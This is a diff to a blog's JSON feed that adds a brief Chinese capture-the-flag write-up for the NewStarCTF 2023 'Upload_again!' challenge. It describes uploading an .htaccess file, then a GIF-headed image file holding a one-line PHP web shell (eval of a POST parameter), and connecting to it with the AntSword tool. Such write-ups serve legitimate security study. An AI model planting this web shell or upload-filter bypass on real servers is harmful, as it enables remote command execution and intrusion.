@@ -5,6 +5,17 @@
     "home_page_url": "http://odiws.github.io",
     "items": [
         {
+            "id": "http://odiws.github.io/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/",
+            "url": "http://odiws.github.io/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/",
+            "title": "[NewStarCT_2023_公开赛道]Upload_again!",
+            "date_published": "2024-12-01T13:23:47.000Z",
+            "content_html": "<p>文件上传（先上传 htaccess 文件（虽然访问不了，但是可以用哇））：</p>\n<p><img data-src=\"C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201212849291.png\" alt=\"image-20241201212849291\"></p>\n<p><img data-src=\"C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201212929266.png\" alt=\"image-20241201212929266\"></p>\n<p>上传 jpg 文件：</p>\n<pre><code>GIF89a\n&lt;script language=&quot;php&quot;&gt;\neval($_POST['cmd']);\n&lt;/script&gt;\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201213001489.png\" alt=\"image-20241201213001489\"></p>\n<p>蚁剑链接</p>\n<p><img data-src=\"C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241201213100531.png\" alt=\"image-20241201213100531\"></p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L015b241L2FydGljbGUvZGV0YWlscy8xMzM4MTk3NTg=\">https://blog.csdn.net/Myon5/article/details/133819758</span></p>\n",
+            "tags": [
+                "buuctf",
+                "文件上传"
+            ]
+        },
+        {
             "id": "http://odiws.github.io/2024/11/03/CISCN2021Quals-upload/",
             "url": "http://odiws.github.io/2024/11/03/CISCN2021Quals-upload/",
             "title": "[CISCN2021Quals]upload",
